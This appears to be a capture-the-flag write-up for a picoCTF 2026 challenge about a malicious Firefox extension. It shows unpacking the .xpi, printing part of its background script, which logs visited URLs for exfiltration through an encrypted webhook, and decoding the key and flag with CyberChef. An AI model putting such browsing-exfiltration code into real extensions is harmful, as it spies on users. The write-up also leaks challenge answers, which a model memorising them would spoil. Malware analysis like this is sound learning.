# The Add/On Trap — picoCTF 2026

Inspect the ZIP file:

    file suspicious.zip
    suspicious.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

Inspect the `.xpi` file (Firefox extension):

    file 56102ec0438646c68605-1.0.xpi
    56102ec0438646c68605-1.0.xpi: Zip archive data, at least v2.0 to extract, compression method=deflate

Check for readable strings:

    strings 56102ec0438646c68605-1.0.xpi | less

Extract the extension:

    unzip 56102ec0438646c68605-1.0.xpi

List all extracted files:

    find -type f
    ./suspicious.zip
    ./56102ec0438646c68605-1.0.xpi
    ./manifest.json
    ./popup.html
    ./icons/icon-64.png
    ./icons/icon-32.png
    ./assets/styles.css
    ./assets/script.js
    ./background/main.js
    ./META-INF/cose.manifest
    ./META-INF/cose.sig
    ./META-INF/manifest.mf
    ./META-INF/mozilla.sf
    ./META-INF/mozilla.rsa

Inspect the background script:

    head -7 ./background/main.js
    // Secret key must be 32 url-safe base64-encoded bytes!
    // TODO I must find a solution to remove the key from here, for now I'll leave it there because I need it to encrypt the webhook
    function logOnCompleted(details) {
        console.log(`Information to exfiltrate: ${details.url}`);
        const key="cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="
        const webhookUrl='gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'

Decode the Base64 key:

    cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=
    → picoCTF{you're on the right tra}

CyberChef link:

    https://cyberchef.ansatt.nav.no/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Y0dsamIwTlVSbnQ1YjNVbmNtVWdiMjRnZEdobElISnBaMmgwSUhSeVlYMD0&oeol=FF

The hint suggests Fernet encryption:

    Hint 2: Which modern Python scheme uses url-safe Base64 32-byte keys?

Decrypt the webhook URL using Fernet with the extracted key:  
https://cyberchef.org/#recipe=Fernet_Decrypt('cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0%3D')&input=Z0FBQUFBQm1mUmp3RktVQi1YM0dCQnFhTjF0WlljUGc1b0xKVko1WFFIRm9nRWdjUlN4U2lzMWU0cXdpY0FLb2htanFhRC1RRzhESU41aWUzdWlqQ1ZBZTN4aVltb0VIbHhBVFdVUDNEQzk3UjAwQ2drdzRmM0haS3NQNXhIZXdPcVZQSDhhcDlGYkU

The decrypted Fernet payload reveals the real flag.
